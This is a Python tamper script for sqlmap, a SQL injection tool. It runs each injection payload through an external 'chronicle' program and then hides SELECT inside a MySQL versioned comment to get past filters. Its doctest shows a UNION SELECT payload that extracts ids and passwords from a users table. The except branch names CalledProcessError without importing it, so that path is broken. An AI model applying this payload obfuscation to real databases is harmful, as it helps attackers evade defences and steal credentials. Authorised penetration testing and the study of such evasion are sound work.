#!/usr/bin/env python

"""
Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import os
import random
import subprocess

from thirdparty import six
from lib.core.data import paths
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    >>> tamper('SELECT 1,2 FROM Dual WHERE 1 = 1 UNION SELECT id, pwd FROM users')
    'SELECT 1,2 FROM Dual WHERE 1 = 1 AND 1 = (@a := (SELECT id FROM users LIMIT 1 OFFSET 0)) AND 1 = (@b := (SELECT pwd FROM users LIMIT 1 OFFSET 0)) UNION SELECT @a, @b'
    """

    retVal = payload

    if six.PY2:
        try:
            out = subprocess.check_output([os.path.join(paths.SQLMAP_ROOT_PATH, "chronicle"), "-query", payload, "-fix"]).split('\n')
            random.shuffle(out)
            retVal = out[0]
        except CalledProcessError:
            pass
    elif six.PY3:
        cb = subprocess.run([os.path.join(paths.SQLMAP_ROOT_PATH, "chronicle"), "-query", payload, "-fix"], capture_output=True, encoding='utf-8')
        if cb.returncode == 0:
            out = cb.stdout.split('\n')
            random.shuffle(out)
            retVal = out[0]

    if " SELECT" in retVal:
        retVal = "%s/*!%s*/%s" % (retVal[:retVal.find(" SELECT")], "SELECT", retVal[retVal.find(" SELECT") + 8:])

    return retVal.replace("SESSION_USER", "CURRENT_USER")
